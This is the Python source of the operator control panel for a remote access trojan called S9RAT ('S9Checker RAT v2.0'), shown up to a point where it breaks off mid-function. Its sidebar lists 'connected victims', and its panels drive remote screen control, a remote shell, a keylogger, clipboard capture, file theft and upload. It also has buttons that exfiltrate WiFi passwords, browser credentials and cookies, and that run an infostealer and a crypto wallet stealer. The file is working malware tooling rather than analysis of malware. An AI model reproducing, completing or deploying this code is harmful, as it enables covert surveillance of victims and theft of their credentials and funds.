
import io
import logging
import threading
import time
from typing import Optional

logger = logging.getLogger("S9RAT")

try:
    import customtkinter as ctk
    import tkinter as tk
    from tkinter import messagebox
    from PIL import Image, ImageTk
    HAS_GUI = True
except ImportError:
    HAS_GUI = False

THEME = {
    "bg": "#0a0a0c",
    "panel": "#111115",
    "panel_light": "#1a1a20",
    "toolbar": "#0e0e12",
    "card": "#18181e",
    "card_hover": "#22222a",
    "accent": "#d4a017",
    "accent_hover": "#e8b828",
    "accent_dim": "#8a6a0f",
    "green": "#2ecc71",
    "green_dark": "#27ae60",
    "red": "#e74c3c",
    "red_dark": "#c0392b",
    "amber": "#f39c12",
    "amber_dark": "#d68910",
    "cyan": "#00d2d3",
    "text": "#e8e8e8",
    "text_dim": "#7a7a85",
    "text_muted": "#4a4a55",
    "border": "#2a2a32",
    "black": "#000000",
}


class HackerGUI:

    def __init__(self, server):
        if not HAS_GUI:
            raise ImportError("customtkinter and Pillow required for GUI")
        self.server = server
        self.root = ctk.CTk()
        self.root.title("S9Checker RAT v2.0")
        self.root.geometry("1400x900")
        self.root.configure(fg_color=THEME["bg"])
        self.root.minsize(1000, 700)

        self.current_client: str | None = None
        self._photos: dict[str, ImageTk.PhotoImage] = {}
        self._stream_active = False
        self._control_active = False
        self._current_tab: str | None = None
        self._screen_tabs: dict[str, dict] = {}
        self._frame_lock = threading.Lock()
        self._frame_skip = False
        self._shell_history: list[str] = []
        self._shell_output_lines: list[str] = []
        self._process_data: list[dict] = []
        self._keylog_active = False
        self._clipboard_text = ""
        self._chat_messages: list[str] = []
        self._tab_buttons: dict[str, ctk.CTkButton] = {}

        self.server.set_callbacks(
            on_connect=self._on_client_connect,
            on_disconnect=self._on_client_disconnect,
            on_screen_frame=self._on_screen_frame,
            on_exfil_data=self._on_exfil_data,
            on_shell_output=self._on_shell_output,
            on_process_data=self._on_process_data,
            on_keylog_data=self._on_keylog_data,
            on_clipboard_data=self._on_clipboard_data,
            on_chat_display=self._on_chat_display,
            on_file_browse=self._on_file_browse,
            on_file_download_data=self._on_file_download_data,
            on_file_transfer_end=self._on_file_transfer_end,
        )

        self._build_ui()
        self._poll_clients()
        self._update_clock()

    def _build_ui(self):
        main = ctk.CTkFrame(self.root, fg_color=THEME["bg"])
        main.pack(fill="both", expand=True, padx=6, pady=6)

        self._build_sidebar(main)
        self._build_center(main)
        self._build_right_panel(main)
        self._build_status_bar()

    def _build_sidebar(self, parent):
        sidebar = ctk.CTkFrame(parent, fg_color=THEME["panel"], width=240)
        sidebar.pack(side="left", fill="y", padx=(0, 4))
        sidebar.pack_propagate(False)

        header_frame = ctk.CTkFrame(sidebar, fg_color="transparent")
        header_frame.pack(fill="x", padx=12, pady=(12, 4))
        ctk.CTkLabel(header_frame, text="S9RAT", font=("Segoe UI", 16, "bold"),
                      text_color=THEME["accent"]).pack(side="left")
        ctk.CTkLabel(header_frame, text="v2.0", font=("Segoe UI", 10),
                      text_color=THEME["text_muted"]).pack(side="left", padx=(4, 0), pady=(4, 0))

        status_frame = ctk.CTkFrame(sidebar, fg_color="transparent")
        status_frame.pack(fill="x", padx=12, pady=(2, 6))
        self.server_status_label = ctk.CTkLabel(status_frame, text="● Online",
                                                 font=("Segoe UI", 10, "bold"),
                                                 text_color=THEME["green"])
        self.server_status_label.pack(side="left")

        ctk.CTkFrame(sidebar, fg_color=THEME["border"], height=1).pack(fill="x", padx=12, pady=4)

        victims_header = ctk.CTkFrame(sidebar, fg_color="transparent")
        victims_header.pack(fill="x", padx=12, pady=(4, 2))
        ctk.CTkLabel(victims_header, text="CONNECTED VICTIMS", font=("Segoe UI", 10, "bold"),
                      text_color=THEME["text_dim"]).pack(side="left")
        self.client_count_label = ctk.CTkLabel(victims_header, text="0",
                                                 font=("Segoe UI", 10, "bold"),
                                                 text_color=THEME["accent"])
        self.client_count_label.pack(side="right")

        self.client_list = ctk.CTkScrollableFrame(sidebar, fg_color="transparent",
                                                    scrollbar_button_color=THEME["border"],
                                                    scrollbar_button_hover_color=THEME["card_hover"])
        self.client_list.pack(fill="both", expand=True, padx=8, pady=(4, 0))

        btn_frame = ctk.CTkFrame(sidebar, fg_color="transparent")
        btn_frame.pack(fill="x", padx=8, pady=8)
        ctk.CTkButton(btn_frame, text="Refresh", command=self._refresh_clients,
                       fg_color=THEME["card"], hover_color=THEME["card_hover"],
                       text_color=THEME["text"], height=32, font=("Segoe UI", 11)).pack(fill="x")

    def _build_center(self, parent):
        center = ctk.CTkFrame(parent, fg_color=THEME["panel"])
        center.pack(side="left", fill="both", expand=True, padx=(0, 4))

        toolbar = ctk.CTkFrame(center, fg_color=THEME["toolbar"], height=48)
        toolbar.pack(fill="x", padx=8, pady=(8, 4))

        self.stream_btn = ctk.CTkButton(toolbar, text="  Start Stream  ",
                                         command=self._toggle_stream,
                                         fg_color="transparent", border_width=2,
                                         border_color=THEME["green"],
                                         text_color=THEME["green"], width=130, height=32,
                                         font=("Segoe UI", 11, "bold"))
        self.stream_btn.pack(side="left", padx=(0, 4))

        sep1 = ctk.CTkFrame(toolbar, fg_color=THEME["accent_dim"], width=1, height=20)
        sep1.pack(side="left", padx=4, pady=6)

        self.control_btn = ctk.CTkButton(toolbar, text="  Enable Control  ",
                                          command=self._toggle_control,
                                          fg_color="transparent", border_width=2,
                                          border_color=THEME["amber"],
                                          text_color=THEME["amber"], width=140, height=32,
                                          font=("Segoe UI", 11, "bold"))
        self.control_btn.pack(side="left", padx=4)

        sep2 = ctk.CTkFrame(toolbar, fg_color=THEME["accent_dim"], width=1, height=20)
        sep2.pack(side="left", padx=4, pady=6)

        self.client_label = ctk.CTkLabel(toolbar, text="No client selected",
                                          font=("Segoe UI", 12), text_color=THEME["text_dim"])
        self.client_label.pack(side="left", padx=12)

        self.fps_label = ctk.CTkLabel(toolbar, text="", font=("Consolas", 10),
                                       text_color=THEME["text_muted"])
        self.fps_label.pack(side="right", padx=8)

        self._build_screen_tabs(center)

        nav_frame = ctk.CTkFrame(center, fg_color="transparent")
        nav_frame.pack(fill="x", padx=8, pady=(4, 0))
        self.feature_var = tk.StringVar(value="screen")
        features = [
            ("🖥 Screen", "screen"),
            ("💻 Terminal", "terminal"),
            ("⚙ Processes", "processes"),
            ("⌨ Keylog", "keylog"),
            ("📋 Clipboard", "clipboard"),
            ("💬 Chat", "chat"),
            ("📁 Files", "files"),
            ("📊 Exfil", "exfil"),
            ("🔑 Stealer", "stealer"),
            ("🪙 Crypto", "crypto"),
        ]
        for label, val in features:
            btn = ctk.CTkButton(
                nav_frame, text=label,
                command=lambda v=val: self._switch_feature_to(v),
                fg_color=THEME["card"], text_color=THEME["text_dim"],
                hover_color=THEME["card_hover"],
                height=30, font=("Segoe UI", 10),
                corner_radius=14)
            btn.pack(side="left", padx=2, pady=2)
            self._tab_buttons[val] = btn

        self.feature_container = ctk.CTkFrame(center, fg_color=THEME["panel"])
        self.feature_container.pack(fill="both", expand=True, padx=8, pady=(4, 8))

        self._build_feature_screen()
        self._build_feature_terminal()
        self._build_feature_processes()
        self._build_feature_keylog()
        self._build_feature_clipboard()
        self._build_feature_chat()
        self._build_feature_files()
        self._build_feature_exfil()
        self._build_feature_stealer()
        self._build_feature_crypto()

        self._show_feature("screen")

    def _switch_feature_to(self, name: str):
        self.feature_var.set(name)
        self._update_tab_button_styles(name)
        self._show_feature(name)

    def _update_tab_button_styles(self, active_name: str):
        for name, btn in self._tab_buttons.items():
            if name == active_name:
                btn.configure(fg_color=THEME["accent"], text_color=THEME["black"],
                              hover_color=THEME["accent_hover"])
            else:
                btn.configure(fg_color=THEME["card"], text_color=THEME["text_dim"],
                              hover_color=THEME["card_hover"])

    def _build_screen_tabs(self, parent):
        screen_outer = ctk.CTkFrame(parent, fg_color=THEME["black"])
        screen_outer.pack(fill="both", expand=True, padx=8, pady=4)
        self.screen_outer = screen_outer

        self.screen_canvas = tk.Canvas(screen_outer, bg=THEME["black"], highlightthickness=0)
        self.screen_canvas.pack(fill="both", expand=True)
        self.screen_canvas.bind("<Button-1>", self._on_mouse_click)
        self.screen_canvas.bind("<B1-Motion>", self._on_mouse_drag)
        self.screen_canvas.bind("<ButtonRelease-1>", self._on_mouse_release)
        self.screen_canvas.bind("<Double-Button-1>", self._on_mouse_double)
        self.screen_canvas.bind("<MouseWheel>", self._on_mouse_scroll)
        self.screen_canvas.bind("<Motion>", self._on_mouse_move)
        self.screen_canvas.bind("<Button-3>", self._on_right_click)

        self.monitor_var = tk.StringVar(value="All Screens")
        self.monitor_menu = ctk.CTkOptionMenu(screen_outer, variable=self.monitor_var,
                                                values=["All Screens"],
                                                command=self._on_monitor_select,
                                                fg_color=THEME["card"],
                                                button_color=THEME["accent"],
                                                button_hover_color=THEME["accent_hover"],
                                                text_color=THEME["text"],
                                                dropdown_fg_color=THEME["panel"],
                                                dropdown_hover_color=THEME["card_hover"],
                                                width=160, height=28,
                                                font=("Segoe UI", 10))
        self.monitor_menu.place(relx=1.0, rely=0.0, anchor="ne", x=-8, y=8)

    def _build_right_panel(self, parent):
        right = ctk.CTkFrame(parent, fg_color=THEME["panel"], width=260)
        right.pack(side="right", fill="y")
        right.pack_propagate(False)

        ctk.CTkLabel(right, text="POWER", font=("Segoe UI", 11, "bold"),
                      text_color=THEME["red"]).pack(padx=12, pady=(12, 4), anchor="w")

        power_frame = ctk.CTkFrame(right, fg_color="transparent")
        power_frame.pack(fill="x", padx=8, pady=4)
        for label, cmd, color in [
            ("Shutdown", "shutdown", THEME["red"]),
            ("Restart", "restart", THEME["amber"]),
            ("Logoff", "logoff", THEME["cyan"]),
        ]:
            ctk.CTkButton(power_frame, text=label,
                           command=lambda c=cmd: self._power_action(c),
                           fg_color="transparent", border_width=2,
                           border_color=color, text_color=color, height=28,
                           font=("Segoe UI", 10, "bold")).pack(fill="x", pady=2)

        ctk.CTkFrame(right, fg_color=THEME["border"], height=1).pack(fill="x", padx=12, pady=8)

        ctk.CTkLabel(right, text="REMOTE ACTIONS", font=("Segoe UI", 11, "bold"),
                      text_color=THEME["accent"]).pack(padx=12, pady=(0, 4), anchor="w")

        actions_frame = ctk.CTkFrame(right, fg_color="transparent")
        actions_frame.pack(fill="x", padx=8, pady=4)

        ctk.CTkButton(actions_frame, text="Chat Message",
                       command=self._send_chat_popup,
                       fg_color=THEME["accent"], hover_color=THEME["accent_hover"],
                       text_color=THEME["black"], height=30,
                       font=("Segoe UI", 10)).pack(fill="x", pady=2)

        ctk.CTkButton(actions_frame, text="Refresh Clipboard",
                       command=self._refresh_clipboard,
                       fg_color=THEME["amber"], hover_color=THEME["amber_dark"],
                       text_color=THEME["black"], height=30,
                       font=("Segoe UI", 10)).pack(fill="x", pady=2)

        ctk.CTkButton(actions_frame, text="Screenshot",
                       command=self._take_screenshot,
                       fg_color=THEME["cyan"], hover_color=THEME["cyan"],
                       text_color=THEME["black"], height=30,
                       font=("Segoe UI", 10)).pack(fill="x", pady=2)

        ctk.CTkFrame(right, fg_color=THEME["border"], height=1).pack(fill="x", padx=12, pady=8)

        ctk.CTkLabel(right, text="PROTOCOL", font=("Segoe UI", 11, "bold"),
                      text_color=THEME["accent"]).pack(padx=12, pady=(0, 2), anchor="w")
        ctk.CTkLabel(right, text="Protocol v2.0", font=("Segoe UI", 10),
                      text_color=THEME["text_dim"]).pack(padx=12, anchor="w")

        ctk.CTkFrame(right, fg_color=THEME["border"], height=1).pack(fill="x", padx=12, pady=8)

        ctk.CTkLabel(right, text="INFO", font=("Segoe UI", 11, "bold"),
                      text_color=THEME["accent"]).pack(padx=12, pady=(0, 4), anchor="w")

        self.info_text = ctk.CTkTextbox(right, fg_color=THEME["card"],
                                          text_color=THEME["text"],
                                          font=("Consolas", 10), height=200)
        self.info_text.pack(fill="x", padx=8, pady=(0, 8))

    def _build_status_bar(self):
        self.status_bar = ctk.CTkFrame(self.root, fg_color=THEME["toolbar"], height=28)
        self.status_bar.pack(fill="x", side="bottom")
        self.status_label = ctk.CTkLabel(self.status_bar, text="Ready",
                                          font=("Consolas", 9), text_color=THEME["text_muted"])
        self.status_label.pack(side="left", padx=12)
        self.clock_label = ctk.CTkLabel(self.status_bar, text=time.strftime("%H:%M:%S"),
                                         font=("Consolas", 9), text_color=THEME["text_muted"])
        self.clock_label.pack(side="right", padx=12)

    def _update_clock(self):
        self.clock_label.configure(text=time.strftime("%H:%M:%S"))
        self.root.after(1000, self._update_clock)

    def _build_feature_screen(self):
        self._screen_frame = self.feature_container

    def _build_feature_terminal(self):
        frame = ctk.CTkFrame(self.feature_container, fg_color=THEME["panel"])

        input_frame = ctk.CTkFrame(frame, fg_color="transparent")
        input_frame.pack(fill="x", padx=8, pady=8)
        ctk.CTkLabel(input_frame, text="$", font=("Consolas", 14, "bold"),
                      text_color=THEME["green"]).pack(side="left", padx=(0, 4))
        self.shell_input = ctk.CTkEntry(input_frame, placeholder_text="Enter command...",
                                          fg_color=THEME["card"], text_color=THEME["green"],
                                          border_color=THEME["border"],
                                          font=("Consolas", 12), height=36)
        self.shell_input.pack(side="left", fill="x", expand=True)
        self.shell_input.bind("<Return>", self._send_shell_command)
        ctk.CTkButton(input_frame, text="Run", command=self._send_shell_command,
                       fg_color=THEME["green"], hover_color=THEME["green_dark"],
                       text_color=THEME["black"], width=60, height=36,
                       font=("Consolas", 11, "bold")).pack(side="right", padx=(4, 0))

        self.shell_text = ctk.CTkTextbox(frame, fg_color=THEME["black"],
                                           text_color=THEME["green"],
                                           font=("Consolas", 11), height=400)
        self.shell_text.pack(fill="both", expand=True, padx=8, pady=(0, 8))

        self._terminal_frame = frame

    def _build_feature_processes(self):
        frame = ctk.CTkFrame(self.feature_container, fg_color=THEME["panel"])

        btn_frame = ctk.CTkFrame(frame, fg_color="transparent")
        btn_frame.pack(fill="x", padx=8, pady=8)
        ctk.CTkButton(btn_frame, text="Refresh Processes",
                       command=self._refresh_processes,
                       fg_color=THEME["green"], hover_color=THEME["green_dark"],
                       text_color=THEME["black"], height=30,
                       font=("Segoe UI", 10)).pack(side="left", padx=(0, 4))
        ctk.CTkButton(btn_frame, text="Kill Selected",
                       command=self._kill_selected_process,
                       fg_color=THEME["red"], hover_color=THEME["red_dark"],
                       text_color=THEME["black"], height=30,
                       font=("Segoe UI", 10)).pack(side="left", padx=4)

        cols = ("PID", "Name", "User", "CPU%", "Mem%")
        self.process_tree = ctk.CTkTextbox(frame, fg_color=THEME["black"],
                                            text_color=THEME["text"],
                                            font=("Consolas", 10))
        self.process_tree.pack(fill="both", expand=True, padx=8, pady=(0, 8))

        self._processes_frame = frame

    def _build_feature_keylog(self):
        frame = ctk.CTkFrame(self.feature_container, fg_color=THEME["panel"])

        btn_frame = ctk.CTkFrame(frame, fg_color="transparent")
        btn_frame.pack(fill="x", padx=8, pady=8)
        self.keylog_btn = ctk.CTkButton(btn_frame, text="Start Keylogger",
                                         command=self._toggle_keylog,
                                         fg_color=THEME["green"], hover_color=THEME["green_dark"],
                                         text_color=THEME["black"], height=30,
                                         font=("Segoe UI", 10))
        self.keylog_btn.pack(side="left", padx=(0, 4))
        ctk.CTkButton(btn_frame, text="Clear",
                       command=self._clear_keylog,
                       fg_color=THEME["card"], hover_color=THEME["card_hover"],
                       text_color=THEME["text"], height=30,
                       font=("Segoe UI", 10)).pack(side="left", padx=4)

        self.keylog_text = ctk.CTkTextbox(frame, fg_color=THEME["black"],
                                           text_color=THEME["green"],
                                           font=("Consolas", 12))
        self.keylog_text.pack(fill="both", expand=True, padx=8, pady=(0, 8))

        self._keylog_frame = frame

    def _build_feature_clipboard(self):
        frame = ctk.CTkFrame(self.feature_container, fg_color=THEME["panel"])

        btn_frame = ctk.CTkFrame(frame, fg_color="transparent")
        btn_frame.pack(fill="x", padx=8, pady=8)
        ctk.CTkButton(btn_frame, text="Get Clipboard",
                       command=self._refresh_clipboard,
                       fg_color=THEME["green"], hover_color=THEME["green_dark"],
                       text_color=THEME["black"], height=30,
                       font=("Segoe UI", 10)).pack(side="left")

        self.clipboard_text = ctk.CTkTextbox(frame, fg_color=THEME["black"],
                                              text_color=THEME["amber"],
                                              font=("Consolas", 12))
        self.clipboard_text.pack(fill="both", expand=True, padx=8, pady=(0, 8))

        self._clipboard_frame = frame

    def _build_feature_chat(self):
        frame = ctk.CTkFrame(self.feature_container, fg_color=THEME["panel"])

        self.chat_display = ctk.CTkTextbox(frame, fg_color=THEME["black"],
                                            text_color=THEME["text"],
                                            font=("Segoe UI", 11))
        self.chat_display.pack(fill="both", expand=True, padx=8, pady=8)

        input_frame = ctk.CTkFrame(frame, fg_color="transparent")
        input_frame.pack(fill="x", padx=8, pady=(0, 8))
        self.chat_input = ctk.CTkEntry(input_frame, placeholder_text="Type message...",
                                        fg_color=THEME["card"], text_color=THEME["text"],
                                        border_color=THEME["border"],
                                        font=("Segoe UI", 11), height=36)
        self.chat_input.pack(side="left", fill="x", expand=True)
        self.chat_input.bind("<Return>", self._send_chat)
        ctk.CTkButton(input_frame, text="Send", command=self._send_chat,
                       fg_color=THEME["accent"], hover_color=THEME["accent_hover"],
                       text_color=THEME["black"], width=60, height=36,
                       font=("Segoe UI", 10, "bold")).pack(side="right", padx=(4, 0))

        self._chat_frame = frame

    def _build_feature_exfil(self):
        frame = ctk.CTkFrame(self.feature_container, fg_color=THEME["panel"])

        btn_frame = ctk.CTkFrame(frame, fg_color="transparent")
        btn_frame.pack(fill="x", padx=8, pady=8)
        exfil_buttons = [
            ("System Info", "system_info"),
            ("WiFi Passwords", "wifi_passwords"),
            ("Browser Creds", "browser_creds"),
            ("Browser Cookies", "browser_cookies"),
            ("File List", "file_list"),
            ("Geoloc IP", "geolocation"),
        ]
        for label, exfil_type in exfil_buttons:
            ctk.CTkButton(btn_frame, text=label,
                           command=lambda t=exfil_type: self._request_exfil(t),
                           fg_color=THEME["card"], hover_color=THEME["card_hover"],
                           text_color=THEME["text"], height=30,
                           font=("Segoe UI", 10)).pack(side="left", padx=2)

        self.exfil_text = ctk.CTkTextbox(frame, fg_color=THEME["black"],
                                          text_color=THEME["text"],
                                          font=("Consolas", 10))
        self.exfil_text.pack(fill="both", expand=True, padx=8, pady=(0, 8))

        self._exfil_frame = frame

    def _build_feature_files(self):
        frame = ctk.CTkFrame(self.feature_container, fg_color=THEME["panel"])

        nav_frame = ctk.CTkFrame(frame, fg_color="transparent")
        nav_frame.pack(fill="x", padx=8, pady=8)

        ctk.CTkButton(nav_frame, text="< Back", command=self._file_browse_back,
                       fg_color=THEME["card"], hover_color=THEME["card_hover"],
                       text_color=THEME["text"], width=60, height=30,
                       font=("Segoe UI", 10)).pack(side="left", padx=(0, 4))

        self.file_path_entry = ctk.CTkEntry(nav_frame, placeholder_text="Enter path...",
                                              fg_color=THEME["card"], text_color=THEME["text"],
                                              border_color=THEME["border"],
                                              font=("Consolas", 11), height=30)
        self.file_path_entry.pack(side="left", fill="x", expand=True, padx=4)
        self.file_path_entry.bind("<Return>", self._file_browse_go)

        ctk.CTkButton(nav_frame, text="Go", command=self._file_browse_go,
                       fg_color=THEME["accent"], hover_color=THEME["accent_hover"],
                       text_color=THEME["black"], width=40, height=30,
                       font=("Segoe UI", 10, "bold")).pack(side="left", padx=4)

        ctk.CTkButton(nav_frame, text="Refresh", command=self._file_browse_refresh,
                       fg_color=THEME["green"], hover_color=THEME["green_dark"],
                       text_color=THEME["black"], width=60, height=30,
                       font=("Segoe UI", 10)).pack(side="left", padx=4)

        btn_frame = ctk.CTkFrame(frame, fg_color="transparent")
        btn_frame.pack(fill="x", padx=8, pady=(0, 4))

        ctk.CTkButton(btn_frame, text="Download", command=self._file_download,
                       fg_color=THEME["cyan"], hover_color=THEME["cyan"],
                       text_color=THEME["black"], height=28,
                       font=("Segoe UI", 10)).pack(side="left", padx=2)

        ctk.CTkButton(btn_frame, text="Upload", command=self._file_upload,
                       fg_color=THEME["amber"], hover_color=THEME["amber_dark"],
                       text_color=THEME["black"], height=28,
                       font=("Segoe UI", 10)).pack(side="left", padx=2)

        self.file_list_text = ctk.CTkTextbox(frame, fg_color=THEME["black"],
                                               text_color=THEME["text"],
                                               font=("Consolas", 10))
        self.file_list_text.pack(fill="both", expand=True, padx=8, pady=(0, 8))
        self.file_list_text.bind("<Double-Button-1>", self._file_browse_double_click)

        self._files_frame = frame
        self._current_browse_path = ""
        self._browse_history = []

    def _build_feature_stealer(self):
        frame = ctk.CTkFrame(self.feature_container, fg_color=THEME["panel"])

        btn_frame = ctk.CTkFrame(frame, fg_color="transparent")
        btn_frame.pack(fill="x", padx=8, pady=8)
        ctk.CTkButton(btn_frame, text="Run Infostealer",
                       command=lambda: self._request_exfil("infostealer"),
                       fg_color=THEME["accent"], hover_color=THEME["accent_hover"],
                       text_color=THEME["black"], height=32,
                       font=("Segoe UI", 11, "bold")).pack(side="left", padx=(0, 4))

        self.stealer_text = ctk.CTkTextbox(frame, fg_color=THEME["black"],
                                            text_color=THEME["text"],
                                            font=("Consolas", 10))
        self.stealer_text.pack(fill="both", expand=True, padx=8, pady=(0, 8))

        self._stealer_frame = frame

    def _build_feature_crypto(self):
        frame = ctk.CTkFrame(self.feature_container, fg_color=THEME["panel"])

        btn_frame = ctk.CTkFrame(frame, fg_color="transparent")
        btn_frame.pack(fill="x", padx=8, pady=8)
        ctk.CTkButton(btn_frame, text="Run Crypto Stealer",
                       command=lambda: self._request_exfil("crypto_stealer"),
                       fg_color=THEME["accent"], hover_color=THEME["accent_hover"],
                       text_color=THEME["black"], height=32,
                       font=("Segoe UI", 11, "bold")).pack(side="left", padx=(0, 4))

        self.crypto_text = ctk.CTkTextbox(frame, fg_color=THEME["black"],
                                           text_color=THEME["text"],
                                           font=("Consolas", 10))
        self.crypto_text.pack(fill="both", expand=True, padx=8, pady=(0, 8))

        self._crypto_frame = frame

    def _switch_feature(self):
        feature = self.feature_var.get()
        self._show_feature(feature)

    def _take_screenshot(self):
        if not self.current_client:
            return
        self.server.take_screenshot(self.current_client)
        self.status_label.configure(text="Taking screenshot...")

    def _file_browse_go(self, event=None):
        if not self.current_client:
            return
        path = self.file_path_entry.get().strip()
        self.server.browse_directory(self.current_client, path)
        self.status_label.configure(text=f"Browsing: {path}")

    def _file_browse_back(self):
        if not self.current_client or not self._browse_history:
            return
        prev = self._browse_history.pop()
        self.server.browse_directory(self.current_client, prev)
        self.status_label.configure(text=f"Browsing: {prev}")

    def _file_browse_refresh(self):
        if not self.current_client:
            return
        self.server.browse_directory(self.current_client, self._current_browse_path)

    def _file_browse_double_click(self, event):
        if not self.current_client:
            return
        try:
            cursor_pos = self.file_list_text.index("insert")
            line_num = int(cursor_pos.split(".")[0])
            content = self.file_list_text.get("1.0", "end")
            lines = content.strip().split("\n")
            if line_num > 0 and line_num < len(lines):
                line = lines[line_num - 1].strip()
                if line.startswith("[DIR] "):
                    name = line[6:]
                    if self._current_browse_path:
                        new_path = self._current_browse_path.rstrip("\\") + "\\" + name
                    else:
                        new_path = name
                    self._browse_history.append(self._current_browse_path)
                    self.server.browse_directory(self.current_client, new_path)
                    self.status_label.configure(text=f"Browsing: {new_path}")
        except Exception:
            pass

    def _handle_file_browse(self, client_id: str, data: dict):
        path = data.get("path", "")
        entries = data.get("entries", [])
        self._current_browse_path = path
        self.file_path_entry.delete(0, "end")
        self.file_path_entry.insert(0, path)
        self.file_list_text.delete("1.0", "end")
        if not path:
            self.file_list_text.insert("end", "=== DRIVES ===\n\n")
        else:
            self.file_list_text.insert("end", f"=== {path} ===\n\n")
        dirs = sorted([e for e in entries if e.get("is_dir")], key=lambda x: x["name"].lower())
        files = sorted([e for e in entries if not e.get("is_dir")], key=lambda x: x["name"].lower())
        for e in dirs:
            self.file_list_text.insert("end", f"[DIR]  {e['name']}\n")
        for e in files:
            size = e.get("size", 0)
            if size > 1024 * 1024:
                size_str = f"{size / (1024 * 1024):.1f} MB"
            elif size > 1024:
                size_str = f"{size / 1024:.1f} KB"
            else:
                size_str = f"{size} B"
            self.file_list_text.insert("end", f"[FILE] {e['name']}  ({size_str})\n")
        self.status_label.configure(text=f"{len(dirs)} dirs, {len(files)} files")

    def _file_download(self):
        if not self.current_client:
            return
        try:
            cursor_pos = self.file_list_text.index("insert")
            line_num = int(cursor_pos.split(".")[0])
            content = self.file_list_text.get("1.0", "end")
            lines = content.strip().split("\n")
            if line_num > 0 and line_num < len(lines):
                line = lines[line_num - 1].strip()
                if line.startswith("[FILE] "):
                    name = line[7:].split("  (")[0]
                    if self._current_browse_path:
                        remote_path = self._current_browse_path.rstrip("\\") + "\\" + name
                    else:
                        remote_path = name
                    from tkinter import filedialog
                    save_path = filedialog.asksaveasfilename(initialfile=name)
                    if save_path:
                        self._pending_download = {"remote": remote_path, "local": save_path}
                        self.server.download_file(self.current_client, remote_path)
                        self.status_label.configure(text=f"Downloading: {name}")
        except Exception:
            pass

    def _handle_file_download_data(self, client_id: str, data: dict, raw_data: bytes):
        if hasattr(self, "_pending_download") and self._pending_download:
            try:
                with open(self._pending_download["local"], "wb") as f:
                    f.write(raw_data)
                self.status_label.configure(text=f"Saved: {self._pending_download['local']}")
            except Exception as e:
                self.status_label.configure(text=f"Save error: {e}")
            self._pending_download = None

    def _file_upload(self):
        if not self.current_client:
            return
        from tkinter import filedialog
        filepath = filedialog.askopenfilename()
        if filepath:
            import os
            filename = os.path.basename(filepath)
            if self._current_browse_path:
                dest = self._current_browse_path.rstrip("\\") + "\\" + filename
            else:
                dest = filename
            self.server.upload_file(self.current_client, filepath, dest)
            self.status_label.configure(text=f"Uploading: {filename}")

    def _show_feature(self, name: str):
        for widget in self.feature_container.winfo_children():
            widget.pack_forget()
        frame_map = {
            "screen": self._screen_frame,
            "terminal": self._terminal_frame,
            "processes": self._processes_frame,
            "keylog": self._keylog_frame,
            "clipboard": self._clipboard_frame,
            "chat": self._chat_frame,
            "files": self._files_frame,
            "exfil": self._exfil_frame,
            "stealer": self._stealer_frame,
            "crypto": self._crypto_frame,
        }
        frame = frame_map.get(name)
        if frame:
            frame.pack(in_=self.feature_container, fill="both", expand=True)
        self._current_tab = name
        self._update_tab_button_styles(name)

    def _on_client_connect(self, client_id: str, info: dict):
        self.root.after(0, self._add_client_ui, client_id, info)

    def _on_client_disconnect(self, client_id: str):
        self.root.after(0, self._remove_client_ui, client_id)

    def _on_screen_frame(self, client_id: str, frame_data: bytes):
        if client_id != self.current_client:
            return
        with self._frame_lock:
            if self._frame_skip:
                return
            self._frame_skip = True
        try:
            img = Image.open(io.BytesIO(frame_data))
            self.root.after(0, self._update_screen, img, len(frame_data))
        except Exception as e:
            logger.error(f"Screen display error: {e}")

    def _update_screen(self, img=None, frame_size=0):
        with self._frame_lock:
            self._frame_skip = False
        if img is not None:
            canvas_w = self.screen_canvas.winfo_width()
            canvas_h = self.screen_canvas.winfo_height()
            if canvas_w > 1 and canvas_h > 1:
                try:
                    resample = Image.Resampling.BILINEAR
                except AttributeError:
                    resample = Image.BILINEAR
                img = img.resize((canvas_w, canvas_h), resample)
                self._photo = ImageTk.PhotoImage(img)
                self.screen_canvas.delete("all")
                self.screen_canvas.create_image(0, 0, anchor="nw", image=self._photo)
                if frame_size > 0:
                    kb = frame_size / 1024
                    self.fps_label.configure(text=f"📦 {kb:.0f} KB")
            else:
                self.root.after(50, self._update_screen, img, frame_size)

    def _on_exfil_data(self, client_id: str, exfil_type: str, data: dict):
        if exfil_type == "file_browse":
            self.root.after(0, self._handle_file_browse, client_id, data)
        elif exfil_type == "file_download":
            self.root.after(0, self._handle_exfil, exfil_type, data)
        elif exfil_type == "infostealer":
            self.root.after(0, self._show_infostealer, data)
        elif exfil_type == "crypto_stealer":
            self.root.after(0, self._show_crypto_stealer, data)
        else:
            self.root.after(0, self._show_exfil, exfil_type, data)

    def _handle_exfil(self, exfil_type: str, data: dict):
        self.exfil_text.delete("1.0", "end")
        self.exfil_text.insert("end", f"=== {exfil_type.upper()} ===\n\n")
        if isinstance(data, dict):
            for key, value in data.items():
                self.exfil_text.insert("end", f"{key}: {value}\n")
        else:
            self.exfil_text.insert("end", str(data))
        self.status_label.configure(text=f"{exfil_type} received")

    def _on_shell_output(self, client_id: str, data: dict):
        self.root.after(0, self._handle_shell_output, data)

    def _on_process_data(self, client_id: str, data: dict):
        self.root.after(0, self._handle_process_data, data)

    def _on_keylog_data(self, client_id: str, data: dict):
        self.root.after(0, self._handle_keylog_data, data)

    def _on_clipboard_data(self, client_id: str, data: dict):
        self.root.after(0, self._handle_clipboard_data, data)

    def _on_chat_display(self, client_id: str, data: dict):
        self.root.after(0, self._handle_chat_display, data)

    def _on_file_browse(self, client_id: str, data: dict):
        self.root.after(0, self._handle_file_browse, client_id, data)

    def _on_file_download_data(self, client_id: str, data: dict, raw_data: bytes):
        self.root.after(0, self._handle_file_download_data, client_id, data, raw_data)

    def _on_file_transfer_end(self, client_id: str, data: dict):
        def _update():
            status = data.get("status", "")
            if status == "done":
                self.status_label.configure(text=f"File saved: {data.get('path', '?')} ({data.get('size', 0)} bytes)")
            else:
                self.status_label.configure(text=f"Transfer error: {data.get('error', 'unknown')}")
        self.root.after(0, _update)

    def _add_client_ui(self, client_id: str, info: dict):
        os_type = info.get("os", "?")
        os_colors = {"Windows": THEME["green"], "Linux": THEME["cyan"], "Darwin": "#9b59b6"}
        os_labels = {"Windows": "W", "Linux": "L", "Darwin": "M"}
        os_icon = os_labels.get(os_type, "?")
        icon_color = os_colors.get(os_type, THEME["text_dim"])

        card = ctk.CTkFrame(self.client_list, fg_color=THEME["card"],
                             corner_radius=8, height=72, border_width=0)
        card.pack(fill="x", pady=2, padx=4)
        card.pack_propagate(False)

        icon_circle = ctk.CTkFrame(card, fg_color=icon_color, width=32, height=32,
                                    corner_radius=16)
        icon_circle.pack(side="left", padx=(10, 6), pady=10)
